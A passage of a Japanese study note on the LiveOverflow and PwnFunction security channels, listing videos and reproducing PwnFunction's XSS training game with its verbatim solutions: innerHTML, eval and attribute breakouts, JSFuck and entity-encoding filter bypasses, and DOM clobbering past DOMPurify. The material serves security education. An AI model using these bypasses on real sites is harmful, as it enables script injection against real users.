# [51] クライアントサイド学習に役立つYouTubeチャンネル: LiveOverflow と PwnFunction

## 取得状況

| URL | 状態 | 取得方法 | 備考 |
| --- | --- | --- | --- |
| https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w (LiveOverflow) | failed（直接）／**full（代替一次データ＝全動画の逐語トランスクリプト）** | WebFetch=egress遮断 / curl=CONNECT 403 / archive.org=遮断 / WebSearch=予算切れ。代替として **LiveOverflow本人が公開する `LiveOverflow/yt_statistics` リポジトリ**（`liveoverflow_videos.jsonl` 全336本＋`all_videos.jsonl`内LO分397本、データ取得日 2023-03-15）を raw.githubusercontent.com から取得し**全動画タイトル・投稿日・再生数・タグ・説明文を逐語で入手** | YouTubeページ自体はプロキシで遮断。ただしチャンネル所有者本人が機械可読データで公開しているため、**動画タイトル・メタデータは一次情報として full 相当**。再生数・説明は2023年3月時点の値。**［補完ラウンドで追加取得］同リポジトリの `liveoverflow_transcripts/<video_id>.txt` に全336本の逐語トランスクリプト（字幕本文）が同梱されており、`git clone https://github.com/LiveOverflow/yt_statistics` で取得。動画の「話している内容そのもの」を一次情報として読めたため、内容面では full。未取得はYouTubeページのUI・登録者数・映像/画面録画の視覚情報のみ** |
| https://www.youtube.com/c/PwnFunction/videos (PwnFunction) | failed（直接）／full（代替一次データ） | 同上。代替として `all_videos.jsonl` 内のPwnFunction分（channel_id=`UCW6MNdOsqv2E9AjQkv9we7A`）**全20本のタイトル・投稿日・再生数・いいね数・コメント数・タグ**を入手。さらに **PwnFunction本人の公式XSSゲーム用リポジトリ `PwnFunction/xss.pwnfunction.com` と `PwnFunction/sandbox.pwnfunction.com`** から**全チャレンジのソースコードと公式解説を逐語で取得** | YouTubeページ自体は遮断。チャンネルの全動画リストは所有者データで full 相当。XSSゲーム教材はGitHub公式リポジトリから完全取得 |

**重要な但し書き**: 対象2つのYouTube URLは組織のegressポリシーで直接取得不可（`www.youtube.com` はプロキシで403 CONNECT拒否、`web.archive.org`・`archive.org` も遮断、`r.jina.ai`・`yewtu.be`・各種ミラーも遮断、WebSearchは本セッションで予算200/200を使い切り）。そのため、**推測でタイトルを作らず**、GitHub上でチャンネル所有者本人が公開している機械可読データ（`raw.githubusercontent.com` と GitHub MCP は許可リスト内で到達可能）のみを一次情報源として用いた。捏造は一切していない。

---

## 要約（3〜10行）

- **LiveOverflow**（チャンネルID `UClcE-kVhqyiHCcjYwcpfj9w`、独 Fabian Fäßler）は、バイナリexploit・リバースエンジニアリング・CTF・ブラウザexploit・Web/クライアントサイドセキュリティを「原理から自分で理解する」姿勢で解説する老舗の技術系チャンネル。動画は連番シリーズ（`bin 0xNN`、`web 0xNN`、`browser 0xNN`）が特徴で、初心者が体系的に辿れる。
- **クライアントサイド学習に直結するLiveOverflowシリーズ**: `web 0x00〜0x05`（HTML/CSS/JS入門〜Same-Origin Policy/Confused Deputy）、AngularJSサンドボックス脱出XSS（`0x0〜0x4`）、Google Search XSS/HTML sanitizer研究、Fuzzing Browsers for XSS、Script Gadgets、DOM Clobbering、Google CTF Web（Pasteurize/Tech Support/All The Little Things）、`browser 0x00〜`（JavaScriptCore/WebKit exploit）、XSS歴史シリーズ、`DO NOT USE alert(1) for XSS`、`Missing HTTP Security Headers` など。
- **PwnFunction**（チャンネルID `UCW6MNdOsqv2E9AjQkv9we7A`）は、アニメーション主体で1トピックを短く洗練して解説するチャンネル。Web脆弱性クラス（Open Redirect / HTTP Parameter Pollution / IDOR / XXE / CSRF / XSS / SSTI / Insecure Deserialization / Electron RCE）の「概念解説」動画が中核で、初学者のクラス学習に最適。
- PwnFunctionは自作の **DOM XSS ゲーム `xss.pwnfunction.com`**（Warmups 8問＋Challenges 6問）を公開しており、`innerHTML`/`eval`/`document.write`/jQuery `html()`/DOMPurify/Bootstrap sanitizer など**実際のsink・フィルタ・DOM Clobberingを手を動かして学べる**。本ノートに全チャレンジのソースと公式解法を逐語収録。
- 両者は交流があり、LiveOverflowの `XSS a Paste Service - Pasteurize` や DOM Clobbering解説動画がPwnFunctionの解説からリンクされる等、相互補完的。読者へのメッセージ: **概念は PwnFunction、深掘り・研究プロセスは LiveOverflow** で学ぶのが定石。
- **［補完ラウンドで追加］LiveOverflowの全336本については、本人が公開する `LiveOverflow/yt_statistics` に「逐語トランスクリプト（字幕本文）」が同梱されていることが判明し、`git clone` で全文を入手した**。これにより、YouTubeが遮断された環境でも**動画で実際に話されている内容**を一次情報として読める。本ノート 4〜15節は、そのトランスクリプトに基づく詳細である。
- 追記された主要トピック: **出力コンテキスト4分類と `htmlspecialchars` の `ENT_QUOTES` 落とし穴**（5節）／**SOPは「送信」ではなく「読み取り」を止める**という非対称性とCSRFトークンの3要件、低深刻度3件を連鎖させるフィッシング（6節）／**Confused Deputy** という理論的支柱（7節）／**`alert(document.domain)` を使う理由とサンドボックスドメイン/iframe**（8節）／**mutation XSS と `<template>` / `<noscript>` のパーサ差異**（9節）／**セキュリティヘッダ欠如は必ずしも脆弱性ではない**という判断基準（10節）／**1995-96年のNetscapeでのSOP誕生の実物**（11節）／**`qs` の `extended: true` による型混同XSS**（12節）／**DOM Clobbering・`window.name`永続性・prototype上書き・JSONP script gadget・`srcdoc` CSPバイパス・括弧なしXSS**の総合演習（13節）。
- **PwnFunctionは依然として部分取得**。`all_videos.jsonl` は他チャンネル分について `description`/トランスクリプトを含まない（フィールドは `channel, channel_id, comments, likes, published, tags, thumbnail, title, video_id, views` のみ、補完ラウンドで確認）。動画本文は読者自身がYouTubeの「文字起こしを表示」または `yt-dlp --write-auto-sub` で取得すること（「読者が自分で開くべき資料」C節）。

---

## 詳細ノート

### 1. LiveOverflow チャンネルの性格 （出典: youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w、代替データ: LiveOverflow/yt_statistics）

- チャンネルID: `UClcE-kVhqyiHCcjYwcpfj9w`。運営者は Fabian Fäßler（独）。付随リポジトリ `LiveOverflow/liveoverflow_youtube`（"Material for the YouTube series"、521★）に各動画のコード・素材が置かれている。
- 特徴的な編集方針: 「答えを教える」より「どう考え、どう調べ、どう失敗したか」を見せる。実際、`Failed DOM Clobbering Research`（失敗研究）や `How did Masato find the Google Search XSS?`（研究プロセスの追体験）といったタイトルが多い。
- シリーズ命名規則:
  - `bin 0x00`〜: バイナリexploitation/リバースエンジニアリング入門（メモリ破壊・ROP・シェルコード等）。
  - `web 0x00`〜`web 0x05`: Webセキュリティ入門（本ノートの主対象）。
  - `browser 0x00`〜: ブラウザexploitation（JavaScriptCore/WebKitのJITバグからのメモリ破壊）。クライアントサイドの「エンジン内部」を学べる希少シリーズ。
  - 「XSS with AngularJS 0x0〜0x4」「The History of XSS」等のミニシリーズ。
- `yt_statistics` の生データ例（**逐語**、リポジトリREADMEより）:

```json
{
    "channel_id": "UClcE-kVhqyiHCcjYwcpfj9w",
    "video_id": "MS7WRuzNYDc",
    "thumbnail": "https://i.ytimg.com/vi/MS7WRuzNYDc/hqdefault.jpg",
    "date": "2022-10-21T15:55:18Z",
    "views": "260530",
    "tags": ["ip address", "leak", "..."],
    "title": "I Leaked My IP Address!",
    "description": "How bad is it to leak your IP address? VPN providers..."
}
```

#### 1-1. web 0x0N 入門シリーズ（クライアントサイドの土台）（出典: yt_statistics）

以下は**実在するタイトル・投稿日・再生数（2023-03時点）・video_id**。URLは `https://www.youtube.com/watch?v=<video_id>`。

| タイトル | 投稿日 | 再生数 | video_id | 要点（説明文より） |
| --- | --- | --- | --- | --- |
| HTML + CSS + JavaScript introduction - web 0x00 | 2016-08-19 | 134,521 | jmgsgjPn1vs | セキュリティに入る前のWeb開発基礎（HTML/CSS/JSの超速入門） |
| The HTTP Protocol: GET /test.html - web 0x01 | 2016-08-23 | 86,989 | C_gZb-rNcVQ | HTTP GETを手で送りWebサーバの動作を学ぶ |
| What is PHP and why is XSS so common there? - web 0x02 | 2016-08-30 | 131,770 | Q2mGcbkX550 | 単純なPHPアプリでXSSが頻発する理由（＝粗悪なチュートリアル） |
| XSS Contexts and some Chrome XSS Auditor tricks - web 0x03 | 2016-09-13 | 78,260 | 8GwVBpTgR2c | XSSの「コンテキスト」とChrome XSS Auditor回避のトリック |
| CSRF Introduction and what is the Same-Origin Policy? - web 0x04 | 2016-09-23 | 113,701 | KaEj_qZgiKY | CSRFとSame-Origin Policyの関係 |
| The Browser is a very Confused Deputy - web 0x05 | 2016-11-01 | 37,852 | Yfsmc0b8o78 | Norm Hardy の名論文 "The Confused Deputy" を読み、XSS/CSRFと接続 |

〔補足（一般知識）〕"Confused Deputy"（混乱した代理人）は、権限を持つ主体が第三者に代理操作させられる古典的問題で、CSRF/SSRF/クリックジャッキングの本質的説明として引用される。

#### 1-2. AngularJS サンドボックス脱出 XSS ミニシリーズ（出典: yt_statistics）

クライアントサイドテンプレートインジェクション（CSTI）の実例。歴史的だが「サンドボックスの発想と破り方」を学ぶ教材として有用。

| タイトル | 投稿日 | video_id | 説明の要点（逐語含む） |
| --- | --- | --- | --- |
| Introducing the AngularJS Javascript Framework - XSS with AngularJS 0x00 | 2016-09-02 | 67Yc8_Bszlk | AngularJS `{{expressions}}` 入門。v1.0.8でのサンドボックス回避XSSへの布石 |
| Sandbox Bypass in Version 1.0.8 - XSS with AngularJS 0x1 | 2016-09-06 | DkL3jaI1cj0 | v1.0.8のサンドボックスを破ってXSS。参考: Mario Heiderich(@0x6d6172696f, cure53.de)、Gareth Heyes(@garethheyes)、PortSwigger "XSS without HTML: Client-Side Template Injection with AngularJS" |
| Previous Bypass is now fixed in version 1.4.7 - XSS with AngularJS 0x2 | 2016-09-16 | 6pGEVDderN4 | v1.4.7で旧回避が修正済みであることを確認 |
| New Sandbox Bypass in 1.4.7 - XSS with AngularJS 0x3 | 2016-09-20 | Hium4FVAR5A | Gareth Heyes による v1.4.7 サンドボックス回避の解説 |
| Sandbox bypass for the latest AngularJS version 1.5.8 - XSS with AngularJS 0x4 | 2016-10-14 | JFIGpRh76XY | v1.5.7の不完全修正を突く（当時最新1.5.8も脆弱） |

#### 1-3. XSS研究・DOM/ブラウザパーサ系（クライアントサイドの核心）（出典: yt_statistics）

| タイトル | 投稿日 | 再生数 | video_id | 要点 |
| --- | --- | --- | --- | --- |
| The Curse of Cross-Origin Stylesheets - Web Security Research | 2018-09-28 | 97,773 | bMPAXsgWNAc | クロスオリジンCSSの2017/2014/2009年バグを辿り「Web研究の進め方」を示す |
| HOW FRCKN' HARD IS IT TO UNDERSTAND A URL?! - uXSS CVE-2018-6128 | 2018-10-19 | 339,141 | 0uejy9aCNbI | URLパースの難しさ（uXSS）。関連: Orange Tsai "A New Era of SSRF - Exploiting URL Parser" |
| End-to-End Encryption in the Browser Impossible? - ProtonMail | 2018-11-23 | 90,391 | DM1tPmxGY7Y | ブラウザ内E2EEの限界（論文読解） |
| XS-Search abusing the Chrome XSS Auditor - filemanager 35c3ctf | 2019-01-21 | 105,470 | HcrQy0C-hEA | XSS AuditorをXS-Searchに悪用。関連: PortSwigger "Exposing intranets with reliable browser-based port scanning" |
| XSS on Google Search - Sanitizing HTML in The Client? | 2019-03-31 | 675,872 | lG7U3fuNw3A | Masato Kinugawa による google.com 上の実XSS。JS有効/無効間のパース差異を悪用。修正: closure-library commit c79ab48 |
| How did Masato find the Google Search XSS? | 2019-04-07 | 156,963 | gVrdE6g_fa8 | XSS研究の思考過程を追う |
| Fuzzing Browsers for weird XSS Vectors | 2019-04-14 | 67,016 | yq_P3dzGiK4 | Firefoxの奇妙なパースで生じるXSSベクタとfuzzing手法。Gareth Heyes、insertScript の shazzer ベクタ参照 |
| Script Gadgets! Google Docs XSS Vulnerability Walkthrough | 2020-07-31 | 136,483 | aCexqB9qi70 | gDocsスプレッドシートのXSS。発見者Nick(thisisqa.com)とGoogle双方の視点 |
| XSS a Paste Service - Pasteurize (web) Google CTF 2020 | 2020-09-09 | 59,931 | Tw7ucd2lKBk | ペーストサービスへのXSS（易）。JohnHammond/Gynvaelの解説にもリンク |
| XSS on the Wrong Domain T_T - Tech Support (web) Google CTF 2020 | 2020-09-18 | 49,714 | 9ecv6ILXrZo | サポートチャットにXSSがあるが「違うドメイン」で発火する問題 |
| Failed DOM Clobbering Research - All The Little Things 1/2 (web) Google CTF 2020 | 2020-09-28 | 27,691 | dZXaQKEE3A8 | DOM Clobbering研究の初期リコン（失敗過程含む） |
| Chaining Script Gadgets to Full XSS - All The Little Things 2/2 (web) Google CTF 2020 | 2020-10-08 | 25,802 | UGtrpXk6QVU | 限定的なscript gadgetを連鎖させ完全XSSへ |
| DO NOT USE alert(1) for XSS | 2021-07-31 | 140,268 | KHwVjzWei1c | XSS実証には `alert(document.domain)` や `alert(window.origin)` を使うべき理由（どのオリジンで発火したか判別可能に） |
| can you hack this screenshot service?? - CSCG 2021 | 2021-08-19 | 145,204 | FCjMoPpOPYI | 自作Web課題（スクリーンショットサービス）。素材: LiveOverflow/ctf-screenshotter |
| Authorization vs. Authentication (Google Bug Bounty) | 2021-12-02 | 42,480 | hmJKUQlcGAc | 認可と認証の違い、正当/不当な認可バグ（GoogleVRP委託動画） |
| Missing HTTP Security Headers - Bug Bounty Tips | 2022-03-16 | 115,843 | 064yDG7Rz80 | 各種HTTPセキュリティヘッダの効果とバグバウンティ文脈での深刻度 |

#### 1-4. XSSの歴史シリーズ "The History of XSS"（出典: yt_statistics）

| タイトル | 投稿日 | video_id | 要点 |
| --- | --- | --- | --- |
| The Same Origin Policy - Hacker History | 2022-07-23 | bSJm8-zJTzQ | 1995年NetscapeのJavaScript(LiveScript)がクライアントサイドWebセキュリティの起点、SOPの成立 |
| The Three JavaScript Hacking Legends | 2022-09-04 | VtcA58555lY | 1997年の最初期JS脆弱性と「XSS legends」3人（Bugtraq 1997、LoVerso等） |
| The Age of Universal XSS | 2022-09-23 | gVblb-QhZa4 | 1996-2000年頃、IE(JScript)登場で多発した現在でいうUniversal XSS |
| The Origin of Cross-Site Scripting (XSS) - Hacker Etymology | 2022-10-03 | mKAWpFdVcPY | 「XSS」という語の起源・語源 |

#### 1-5. browser 0xNN — ブラウザexploitation（JavaScriptエンジン内部）（出典: yt_statistics）

クライアントサイドの「その先」＝レンダラ/JSエンジンのメモリ破壊を学ぶシリーズ。Linus Henze の WebKit RegExp exploit を教材に、`addrof()`/`fakeobj()` プリミティブ、JIT、boxed/unboxed値表現を解説。

| タイトル | 投稿日 | video_id |
| --- | --- | --- |
| New Series: Getting Into Browser Exploitation - browser 0x00 | 2019-05-19 | 5tEdSoZ3mmE |
| Hacking Browsers - Setup and Debug JavaScriptCore / WebKit | 2019-05-26 | yJewXMwj38s |
| The Butterfly of JSObject | 2019-06-02 | KVpHouVMTgY |
| Just-in-time Compiler in JavaScriptCore (WebKit) | 2019-06-09 | 45wMEIIPsPA |
| WebKit RegExp Exploit addrof() walk-through | 2019-06-16 | IjyDsVOIx8Y |
| The fakeobj() Primitive: Turning an Address Leak into a Memory Corruption | 2019-06-23 | vwlG2l0ANuc |
| Revisiting JavaScriptCore Internals: boxed vs. unboxed | 2019-06-30 | dhaLk-XO890 |
| Preparing for Stage 2 of a WebKit exploit | 2019-07-14 | 3c6nC0wdU-Q |
| ~~Arbitrary Read and Write in WebKit Exploit~~（**要注意**） | ~~2019-07-21~~ | **該当なし** |

> **※訂正（補完ラウンド）**: `liveoverflow_videos.jsonl`（全336本、2023-03-15取得）に「Arbitrary Read and Write in WebKit Exploit」というタイトル・2019-07-21という日付の動画は**存在しない**。データ上、2019-07-14 の `Preparing for Stage 2 of a WebKit exploit`(3c6nC0wdU-Q) の次は 2019-07-28 の `Minetest Circuit Challenge - Google CTF 2019 Qualifier`(nI8Q1bqT8QU) であり、browserシリーズはStage 2準備回で一旦途切れている。前工程でこの行がどこから来たかは特定できなかったため、**未確認情報として扱い、教科書には載せないこと**。（動画が非公開化された可能性、シリーズが別タイトルで続いた可能性の双方が残る。読者はYouTubeのチャンネルページで自分で確認すること）

参考として本人が挙げる資料（**逐語**）: saelo's phrack paper `http://www.phrack.org/papers/attacking_javascript_engines.html`、niklasb's exploit `https://github.com/niklasb/sploits/blob/master/safari/regexp-uxss.html`。

#### 1-6. その他クライアントサイドで有用な単発（出典: yt_statistics）

- `Reverse Engineering Obfuscated JavaScript`（2017-08-04, 8UqHCrGdxOM）: 難読化JSの読み方（Chrome 59のPopUnderトリック）。
- `Using z3 to find a password and reverse obfuscated JavaScript - Fsec2017 CTF`（2017-10-13, TpdDq56KH1I）。
- `Solving a JavaScript crackme: JS SAFE 2.0 (web) - Google CTF 2018`（2018-06-28, 8yWUaqEcXr4, 487,680再生）: JS実装crackmeのアンチデバッグ回避。
- `What is a Browser Security Sandbox?! (Learn to Hack Firefox)`（2021-07-10, StQ_6juJlZY）: ブラウザのセキュリティサンドボックスとは何か。

〔補足（一般知識）〕LiveOverflowはWeb以外（Minecraftハッキング、ハードウェア、sudo/Log4Shell等のCVE解析）も多いが、本ノートは章10「video-channels」のクライアントサイド学習目的に絞って抽出した。全336本中、Web/クライアントサイド関連は約55本。

---

### 2. PwnFunction チャンネルの性格 （出典: youtube.com/c/PwnFunction/videos、代替データ: all_videos.jsonl）

- チャンネルID: `UCW6MNdOsqv2E9AjQkv9we7A`。運営者ハンドルは **@PwnFunction**（Twitter recipient_id `1084132461133451264`）。
- 特徴: **アニメーション主体**で1つの脆弱性クラス/概念を短時間に凝縮して解説。初学者が「XSSとは」「CSRFとは」を最初に掴むのに最適。LiveOverflowが「深掘り・研究過程」型なのに対し、PwnFunctionは「概念の教科書」型。
- 動画本数は少数精鋭（データ取得時点で20本）。近年はセキュリティ以外（Rust、z3、AI sandbox等）にも展開。
- **PwnFunctionの全動画（`all_videos.jsonl` より、逐語のタイトル・投稿日・再生数/いいね/コメント・タグ）**。URLは `https://www.youtube.com/watch?v=<video_id>`。

| タイトル | 投稿日 | 再生数 | いいね | コメント | video_id | タグ |
| --- | --- | --- | --- | --- | --- | --- |
| Open Redirect Vulnerability Explained | 2019-01-20 | 129,920 | 4,924 | 137 | 4Jk_I-cw4WE | ctf, bug bounty, hacking, web security, web security 101, redirects, ssrf, xss, google, threatcon, phishing |
| HTTP Parameter Pollution Explained | 2019-01-28 | 234,568 | 11,826 | 390 | QVZBl8yxVX0 | Web, Security, Infosec, Hacking, Bug Bounty, HTTP Parameter Pollution |
| Hacking Electron Applications | 2019-02-03 | 90,394 | 3,579 | 109 | jkJWA_CWrQs | websecurity, electronjs, javascript, remote code execution, Web Security |
| Insecure Direct Object Reference (IDOR) Explained | 2019-02-12 | 89,453 | 3,742 | 126 | rloqMGcPMkI | WebSecurity, Insecure Direct Object Reference, IDOR, Bug Bounty, CTF |
| XML External Entities (XXE) Explained | 2019-02-28 | 126,329 | 3,660 | 141 | gjm6VHZa_8s | XXE, XML, External, Entities, WebSecurity, BugBounty, JohnHammond, Web, Infosec, Security, CTF |
| Cross-Site Request Forgery (CSRF) Explained | 2019-04-05 | 346,469 | 10,155 | 240 | eWEgUcHPle0 | csrf, websecurity, infosec, ctf |
| XXE Challenge - Google CTF | 2019-07-07 | 37,375 | 1,539 | 61 | 0fdpFQXWVu4 | ctf, xxe, web, security, googlectf |
| Solving a Hard Google CTF challenge - "Paste-tastic!" | 2019-09-03 | 89,707 | 2,695 | 75 | 2up8J9dErHI | google, ctf, xss, chrome, xssauditor, DOM, DOM clobbering, LiveOverflow, pastetastic, web, security, websecurity, hacking |
| Cross-Site Scripting (XSS) Explained | 2020-03-22 | 370,945 | 12,200 | 464 | EoaDgUgS6QA | XSS, cross site scripting, web, security, xss attacks, explained |
| Server-Side Template Injections Explained | 2020-11-27 | 77,753 | 4,561 | 176 | SN6EVIG4c-0 | SSTI, Template, Injection |
| PwnFunction Live Stream | 2021-01-24 | 0 | 1 | 0 | JQ9KAQrq18U | （ライブ枠） |
| Insecure Deserialization Attack Explained | 2021-01-24 | 91,731 | 4,937 | 233 | jwzeJU_62IQ | （なし） |
| What are Executables? \| bin 0x00 | 2021-03-12 | 163,211 | 7,943 | 236 | WnqOhgI_8wA | （なし） |
| How some functions can be Dangerous \| bin 0x01 | 2021-04-01 | 135,749 | 5,952 | 198 | EJtUW2AklVs | （なし） |
| Why you should Close Your Files \| bin 0x02 | 2021-04-23 | 311,343 | 15,619 | 541 | 6SA6S9Ca5-U | （なし） |
| This Website has No Code  or Does it? | 2021-06-04 | 1,105,087 | 45,098 | 1,302 | msdymgkhePo | （なし。関連repo: Blank-Rick-Roll） |
| Don't make random HTTP requests. | 2021-10-05 | 361,295 | 14,464 | 279 | RCJdPiogUIk | （なし） |
| When You Use One Wrong Javascript Module | 2021-12-13 | 174,908 | 8,475 | 217 | XS_UMqQalLI | （Prototype Pollution関連。repo: Next.js-Flat-Prototype-Pollution） |
| Dangerous Code Hidden in Plain Sight for 12 years | 2022-04-08 | 1,673,991 | 48,914 | 1,200 | eTcVLqKpZJc | （なし） |
| How To Predict Random Numbers Generated By A Computer | 2022-07-14 | 443,629 | 19,434 | 733 | -h_rj2-HP2E | （`Math.random`予測。repo: v8-randomness-predictor） |

**クライアントサイド学習に直結するPwnFunction動画（優先度順）**:
1. `Cross-Site Scripting (XSS) Explained`（EoaDgUgS6QA）— XSSの基礎概念。
2. `Cross-Site Request Forgery (CSRF) Explained`（eWEgUcHPle0）— CSRFとSOP。
3. `Insecure Direct Object Reference (IDOR) Explained`（rloqMGcPMkI）。
4. `Open Redirect Vulnerability Explained`（4Jk_I-cw4WE）— タグにssrf/xss/phishingを含む。
5. `HTTP Parameter Pollution Explained`（QVZBl8yxVX0）。
6. `Hacking Electron Applications`（jkJWA_CWrQs）— Web技術デスクトップアプリのRCE。
7. `Solving a Hard Google CTF challenge - "Paste-tastic!"`（2up8J9dErHI）— **DOM Clobbering解説の定番**。LiveOverflowの複数記事/動画がこの動画の `?t=797`（13分17秒）をDOM Clobbering入門としてリンクしている。
8. `When You Use One Wrong Javascript Module`（XS_UMqQalLI）— npmモジュール由来のPrototype Pollution。
9. `Server-Side Template Injections Explained`（SN6EVIG4c-0）— SSTI（サーバ側だがWeb必修）。
10. `Insecure Deserialization Attack Explained`（jwzeJU_62IQ）。

---

### 3. PwnFunction 公式 DOM XSS ゲーム `xss.pwnfunction.com`（出典: PwnFunction/xss.pwnfunction.com, PwnFunction/sandbox.pwnfunction.com）

PwnFunctionが2019年末〜2020年に公開したブラウザXSS練習場。**Warmups 8問（Easy）＋Challenges 6問（Medium/Hard）**。共通ルール（**逐語**、各チャレンジHTMLより）:

```
Difficulty is <Easy|Medium|Hard>.
Pop an alert(1337) on sandbox.pwnfunction.com.
No user interaction.
Cannot use https://sandbox.pwnfunction.com/?html=&js=&css=.
Tested on Chrome.
```

チャレンジ一覧（READMEの表を**逐語再現**）:

**Warmups**

| Name | Difficulty |
| --- | :--: |
| Ma Spaghet! | Easy |
| Jefff | Easy |
| Ugandan Knuckles | Easy |
| Ricardo Milos | Easy |
| Ah That's Hawt | Easy |
| Ligma | Easy |
| Mafia | Easy |
| Ok, Boomer | Easy |

**Challenges**（難易度は2019末〜2020初時点。現在は新バイパスがあり容易に解ける、と原文注記）

| Name | Difficulty |
| --- | :--: |
| Area 51 | Easy |
| Keanu | Medium |
| WW3 | Hard |
| Jason Bourne | Medium |
| Me and the Bois | Medium |
| Ded | Medium |

> ⚠ 原文注記: このリポジトリは非メンテ。後継として HackerCamp.co を構築中。

#### 3-1. Warmup: Ma Spaghet! （sink=innerHTML）

課題コード（**逐語**）:

```html
<!-- Challenge -->
<h2 id="spaghet"></h2>
<script>
    spaghet.innerHTML = (new URL(location).searchParams.get('somebody') || "Somebody") + " Toucha Ma Spaghet!"
</script>
```

公式解（**逐語**）: GETパラメータ `somebody` が無加工で `innerHTML` に入る。

```markup
<svg onload=alert(1337)>
```

#### 3-2. Warmup: Jefff （sink=eval、文字列ブレイクアウト）

課題コード（**逐語**）:

```html
<!-- Challenge -->
<h2 id="maname"></h2>
<script>
    let jeff = (new URL(location).searchParams.get('jeff') || "JEFFF")
    let ma = ""
    eval(`ma = "Ma name ${jeff}"`)
    setTimeout(_ => {
        maname.innerText = ma
    }, 1000)
</script>
```

公式解（**逐語**）: `jeff` が `eval` 内文字列に入るので二重引用符で文字列を抜けてコード実行。

```js
"-alert(1337)-"
```

#### 3-3. Warmup: Ugandan Knuckles （属性ブレイクアウト、`<>`除去）

課題コード（**逐語**）:

```html
<!-- Challenge -->
<div id="uganda"></div>
<script>
    let wey = (new URL(location).searchParams.get('wey') || "do you know da wey?");
    wey = wey.replace(/[<>]/g, '')
    uganda.innerHTML = `<input type="text" placeholder="${wey}" class="form-control">`
</script>
```

公式解（**逐語**）: `<` `>` は除去され新タグは作れないが、引用符は残るので `placeholder` 属性を抜けて `onfocus`＋`autofocus` で無操作発火。

```js
"onfocus=alert(1337) autofocus="
```

#### 3-4. Warmup: Ricardo Milos （sink=form.action、javascript: URI）

課題コード（**逐語**）:

```html
<!-- Challenge -->
<form id="ricardo" method="GET">
    <input name="milos" type="text" class="form-control" placeholder="True" value="True">
</form>
<script>
    ricardo.action = (new URL(location).searchParams.get('ricardo') || '#')
    setTimeout(_ => {
        ricardo.submit()
    }, 2000)
</script>
```

公式解（**逐語**）: `form.action` にユーザ入力、フォーム自動送信 → `javascript:` URIで実行。

```js
javascript:alert(1337)
```

#### 3-5. Warmup: Ah That's Hawt （HTMLエンティティエンコードで括弧フィルタ回避）

課題コード（**逐語**）:

```html
<!-- Challenge -->
<h2 id="will"></h2>
<script>
    smith = (new URL(location).searchParams.get('markassbrownlee') || "Ah That's Hawt")
    smith = smith.replace(/[\(\`\)\\]/g, '')
    will.innerHTML = smith
</script>
```

公式解（**逐語**）: `()` と バッククォート・バックスラッシュ が除去されるため `alert(1337)` を直接書けない。しかし**属性値はHTMLエンティティエンコード可能**なので、ペイロードをエンティティ化。`&` などURL非安全文字はURLエンコードも併用。

```markup
<!-- URL Encoding + HTML Entity Encoding -->
%3Csvg%20onload%3D%22%26%23x61%3B%26%23x6C%3B%26%23x65%3B%26%23x72%3B%26%23x74%3B%26%23x28%3B%26%23x31%3B%26%23x33%3B%26%23x33%3B%26%23x37%3B%26%23x29%3B%22%3E

<!-- HTML Entity Encoding -->
<svg onload="&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x33;&#x33;&#x37;&#x29;">

<!-- No Encoding -->
<svg onload="alert(1337)">
```

#### 3-6. Warmup: Ligma （英数字全除去→JSFuck）

課題コード（**逐語**）:

```html
<script>
    balls = (new URL(location).searchParams.get('balls') || "Ninja has Ligma")
    balls = balls.replace(/[A-Za-z0-9]/g, '')
    eval(balls)
</script>
```

公式解（**逐語**）: `eval` に入るが英数字が全て空文字に置換される → **JSFuck**（jsfuck.com）で非英数字のみのJSに変換。原文では長大なJSFuck列（URLエンコード版・非エンコード版）と、より短い版が提示される。短縮版（**逐語**）:

```js
/* Shorter */
ᵥ=[];ᵤ=-~ᵥ;ᵞ=-~-~ᵤ;ᵠ=ᵥ+{};ᵨ=-~-~ᵞ;ᵅ=ᵠ[ᵨ];ᵈ=ᵠ[ᵤ];ᵡ=!!ᵥ+ᵥ;ᵜ=ᵡ[ᵤ+~ᵥ];ᵝ=ᵡ[ᵤ];ᵢ=!ᵥ+ᵥ;ᵣ=ᵥ[~ᵥ]+ᵥ;ᵥ[_=ᵅ+ᵈ+ᵣ[ᵤ]+ᵢ[ᵞ]+ᵜ+ᵝ+ᵣ[ᵤ+~ᵥ]+ᵅ+ᵜ+ᵈ+ᵝ][_](ᵢ[ᵤ]+ᵢ[-~ᵤ]+ᵢ[-~ᵞ]+ᵝ+ᵜ+`(${ᵤ+''+ᵞ+ᵞ+-~-~ᵨ})`)()
```

〔補足（一般知識）〕JSFuckは `[]()!+` の6文字のみでチューリング完全なJavaScriptを表現する難読化手法。英数字除去フィルタの典型的回避策。

#### 3-7. Warmup: Mafia （複数フィルタ＋eval、Function/hash利用）

課題コード（**逐語**）:

```js
/* Challenge */
mafia = (new URL(location).searchParams.get('mafia') || '1+1')
mafia = mafia.slice(0, 50)
mafia = mafia.replace(/[\`\'\"\+\-\!\\\[\]]/gi, '_')
mafia = mafia.replace(/alert/g, '_')
eval(mafia)
```

公式解（**逐語**）: 長さ50に切り詰め、`` ` `` `'"+-!\[]` をアンダースコア化、文字列 `alert` もアンダースコア化。回避3案:

```js
Function(/ALERT(1337)/.source.toLowerCase())()
```
```js
eval(8680439..toString(30))(1337)
```
```js
eval(location.hash.slice(1))
```
（最後はURLに `#alert(1337)` を付ける。Thanks to @terjanq）

#### 3-8. Warmup: Ok, Boomer （DOMPurify＋setTimeout、DOM Clobbering）

課題コード（**逐語**）:

```html
<!-- Challenge -->
<h2 id="boomer">Ok, Boomer.</h2>
<script>
    boomer.innerHTML = DOMPurify.sanitize(new URL(location).searchParams.get('boomer') || "Ok, Boomer")
    setTimeout(ok, 2000)
</script>
```

公式解（**逐語＋要点**）: `innerHTML` はDOMPurifyでサニタイズされるが、直後の `setTimeout(ok, 2000)` の `ok` が未定義。**DOM Clobbering**で `ok` 変数を作る。アンカータグを `id=ok` で作ると同名JS変数が生成され、`toString()` で `href` 値を返す性質を利用。`setTimeout` は関数でない場合 `toString()` を呼びその文字列を実行。

```markup
<a id=ok href=tel:alert(1337)>
```

原文の注記（**逐語**）:
- `href` は任意文字列不可。`protocol:host` 形式でなければ値は `BaseURL/yourString` になる。
- `tel:alert(1337)` は `label:code` 構文として妥当なJavaScriptでもある。
- `tel` はDOMPurifyの許可プロトコル（`cure53/DOMPurify` の `src/regexp.js` にホワイトリスト）。

#### 3-9. Challenge: Area 51 （Easy、HTMLコメントのmutation）

課題コード（**逐語**）:

```html
<!-- Challenge -->
<div id="pwnme"></div>
<script>
